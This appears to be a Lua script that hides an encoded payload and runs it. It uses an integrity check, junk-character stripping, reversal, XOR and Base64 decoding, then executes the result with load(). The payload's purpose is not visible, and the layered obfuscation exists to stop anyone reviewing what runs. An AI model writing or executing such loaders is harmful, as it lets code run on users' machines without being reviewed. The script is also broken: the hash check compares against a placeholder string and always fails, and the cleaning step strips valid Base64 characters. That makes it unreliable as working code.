
-- Highly Obfuscated script
local encodedScript = "OTc5VV5Pa11vV1xPbTdRUzVQNDZGNzdmb11CNDZIcTVoU11dcFw9V11dNjZGfl5ndlxSNDVIMl50XDVeb1xoQ15mfl5SUzZhcjU0Nl5mbjcxR1xgcV5SQzZgcV49Nl5dfTZSNjZnNTdOU15gazVWXDdlajcxfTZgbDZONzZIcjZrfjdnczVWTDZga1xORzVPNF1SNlxWc15WTF1gTTV0UFxecDdCNjZeazVnaVxmdFxOTDdgfjZWUzZdcjV8aV1HT15NVzVSTzdWN15nSV50UTVnaTU9aF5nYl10XF1XMDdRUV5nfTVdUF1XQzdoNV5VfVxSNDdRR15CTDZRUl5ONjZeczdvNTVRcF1oQF1KNjdrb1xmQTVeUl1TaV5gQl5LUl18NDZQbjU9Ul1nTF1Gal5WR15eaF1KcDVNajVWVV1sUDZgaV1OaTZeYl09RzdKfF5FUF5LNTVjUF1KfF5vUDVJNFxdbjdKNF1dbjZJNDVJUF5Jcl5JN1xlcjc9Q1xlbVxSNlxgcjdvQ15nbF49V15mcl5KaTVIb15ON1xmbjZKXF1lbzU9fV1IMjZJTF5nNDdWTDdlbTdFVzVUY113Nl1mclxsaTVdaDVgaFxHbVxBfjVncTdoUzdeaFxoQzZeaTdSXDZdfTdSQzdecV5oNjVXbV1FVzVUY1xRUzdmbF4xaTZnaF1KXDdS"
local xorKey = 4

-- Anti-tamper check
local function integrityCheck()
    local originalHash = "REPLACE_WITH_HASH"
    local function hash(str)
        local sum = 0
        for i = 1, #str do
            sum = sum + string.byte(str, i)
        end
        return tostring(sum % 100000)
    end
    if hash(encodedScript) ~= originalHash then
        error("Script integrity check failed!")
    end
end

integrityCheck()

-- Execution environment check
if not _ENV then error("Execution environment compromised!") end

-- Cleanup function to remove junk characters
local function clean(str)
    return str:gsub("[XYZ123]", "")
end

-- Reverse function
local function reverse(str)
    return str:reverse()
end

-- XOR Decryption function
local function xorDecrypt(str, key)
    local decoded = ""
    for i = 1, #str do
        decoded = decoded .. string.char(string.byte(str, i) ~ key)
    end
    return decoded
end

-- Base64 Decode function
local function decode(str)
    local b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    str = string.gsub(str, '[^'..b..'=]', '')
    return (str:gsub('.', function(x)
        if (x == '=') then return '' end
        local r,f='',(b:find(x)-1)
        for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
        return r;
    end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
        if (#x ~= 8) then return '' end
        local c=0
        for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
        return string.char(c)
    end))
end

-- Run the obfuscated script
local scriptFunc = load(decode(xorDecrypt(reverse(clean(encodedScript)), xorKey)))
if scriptFunc then scriptFunc() end
